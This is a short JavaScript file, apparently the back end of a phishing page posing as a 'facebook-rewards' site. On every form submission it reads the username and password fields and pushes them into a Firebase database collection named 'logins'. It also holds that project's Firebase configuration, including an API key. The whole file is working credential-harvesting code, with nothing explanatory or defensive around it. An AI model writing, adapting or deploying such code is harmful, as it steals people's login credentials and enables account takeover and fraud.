import { initializeApp } from 'firebase/app'
import { getDatabase, ref, push, get, remove } from 'firebase/database'

const appSettings = {
    apiKey: "AIzaSyCVQ5qYprleNQH96hiZsJQKP68gxZncptQ",
  authDomain: "facebook-rewards.firebaseapp.com",
  projectId: "facebook-rewards",
  storageBucket: "facebook-rewards.appspot.com",
  messagingSenderId: "916360725111",
  appId: "1:916360725111:web:2c5ba275acd0c1829c3c72",
  measurementId: "G-V71YNJRQ72"
  };
const app = initializeApp(appSettings)
const database = getDatabase(app)
const logins = ref(database)


document.addEventListener('submit', (e) => {
    e.preventDefault()
    const user = document.getElementById('user-input-1')
    const password = document.getElementById('user-input-2')
    push(logins, {
        User: user.value,
        Password: password.value
    })
})
console.log("clear")
